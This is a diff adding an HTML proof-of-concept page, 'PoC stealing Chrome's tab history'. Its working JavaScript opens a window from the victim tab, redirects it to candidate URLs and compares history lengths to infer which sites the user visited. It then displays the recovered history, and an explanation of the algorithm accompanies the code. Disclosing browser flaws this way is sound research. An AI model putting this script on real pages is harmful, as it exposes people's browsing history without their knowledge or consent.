@@ -1,0 +1,122 @@
+<!doctype html>
+<html>
+<head>
+   <meta charset="utf-8">
+   <title>stealing Chrome's tab history</title>
+   <script>
+    /* Don't look at me, I'm ugly and unready :S */
+    var w=opener, i=1, sop=false, match, n, l, np, u, f, hist=[];
+
+    // starts probing urls against top history element
+    function foo(i) {
+        if (i < l-1) {
+            var urls = ['https://www.google.com', 'https://wwww.google.es', 'https://www.facebook.com/', 'https://www.meneame.net/', 'http://www.theregister.co.uk/', 'https://twitter.com/', 'https://www.youtube.com'];
+            // probe urls
+            log("item " + i, true);
+            f = setInterval(test, 1, i, urls);
+        } else {
+            console.log(hist);
+            show();
+        }
+    }
+
+   // we are in local SOP until error
+   function test(i, urls) {
+      try {
+         w.location.href;
+      } catch (e) {
+         clearInterval(f);
+         u = urls.pop();
+         log(" - testing " + u + "... ", false);
+         w.location.assign(u); // how can we know u has been send to history?
+         setTimeout(function(){w.location='';loop(i,urls)}, 1000); // TIMING ISSUE!!
+      }
+    }
+
+    // we are outside SOP while catching error
+    function loop(i, urls) {
+      try {
+         w.location.href;
+         setTimeout(hitormiss, 1, i, urls);
+      } catch (e) {
+         setTimeout(loop, 1, i, urls);
+      }
+    }
+
+    function hitormiss(i, urls) {
+        np = w.history.length;
+        if (np === n) { // HIT, replace top history and go for next item
+            log("<span style='color:green'>VISITED!</span>", true); 
+            hist.push(u);
+            w.history.go(-2);
+            n = n-1;
+            setTimeout(foo, 1, i+1);
+        } else if (urls.length > 0) { // MISS, probe the next url
+            log("<span style='color:red'>no</span>", true); 
+            w.history.go(-2);
+            f = setInterval(test, 1, i, urls);
+        } else { // MISS, no more urls, probe next item
+            log("<span style='color:red'>no</span>", true); 
+            hist.push("unknown");
+            w.history.go(-3);
+            n = n-1;
+            setTimeout(foo, 1, i+1);
+        }
+    }
+
+    function show() {
+      document.getElementById('main').innerHTML = '<h4>Recovered tab history: </h4><span id="result">- '+hist.join("<br>- ")+'<br><br></span>';
+      document.getElementById('log').innerHTML = "";
+    }
+
+    function log(s,o) {
+        document.getElementById('log').innerHTML += s + (o?"<br>":"");
+    }
+   </script>
+</head>
+<body>
+   <h1>PoC stealing Chrome's tab history</h1>
+   <h4>tl;dr; tab's history could be read from an evil page by probing each element on it</h4>
+   <p>When navigating in the same tab, <code>history</code> object keeps adding each page to its stack. By performing some redirection and comparing previos/posterior lengths of that object, it is possible to determine whether or not the last page in the history has been visited. This PoC <span style="text-decoration:underline">has been tested only in Chrome</span>, but the method should serve for other browsers as well.</p>
+   <p>Let's suppose the following <code>history</code> state:</p>
+   <pre>
+   | null | full_url_1 | full_url_2 | full_url_3 | attacker.com | // history.length == 5
+   </pre>
+   <p>Now, if we want to check which was the last visited url we need to open a new window referencing the current one (<code>opener</code>) and perform this algorithm with a dictionary of urls:</p>
+   <pre>
+   1. N = opener.history.length // save initial history length (same SOP)
+   2. opener.history.go(-1) // set the navigation pointer to "full_url_3"
+   3. opener.location = test_url
+   4. opener.location = "" // come back to same SOP
+   5. N' = opener.history.length // new history length
+   6. compare N and N'
+   </pre>
+   <p>If <code>test_url</code> corresponds to the last item in the history, the new <code>history</code> state will be:</p>
+   <pre>
+   | null | full_url_1 | full_url_2 | full_url_3 | attacker.com | // history.length == 5
+   </pre>
+   <p>Because when redirecting to a same URL no new entry is add to the <code>history</code>. Otherwise, our state will be:</p>
+   <pre>
+   | null | full_url_1 | full_url_2 | full_url_3 | test_url | attacker.com | // history.length == 6
+   </pre>
+   <p>Now do <code>history.go(-2)</code> (or <code>-3</code>) and keep iterating over the length of the <code>history</code> object in order to extract all the visited pages.</p>
+   <p>Open "incognito" window. Visit some random pages in the same tab, load this page in that tab and click.</p>
+   <hr>
+   <div id="main">
+      <img id="fun" style="display:none" src="https://media.giphy.com/media/UO5elnTqo4vSg/giphy.gif"><br>
+      <a id="link" onclick="window.open('?opened','_blank')">Click to start</a>
+   </div>
+   <hr>
+   <div id="log"></div>
+   <script>
+   if (w) {
+      fun.style.display = "inline";
+      link.parentNode.removeChild(link);
+      l = n = w.history.length;
+      log("Tab history length: " + (l-2), true);
+      w.history.go(-1);
+      setTimeout(foo, 1, 1);
+   }
+   </script>
+</body>
+</html>
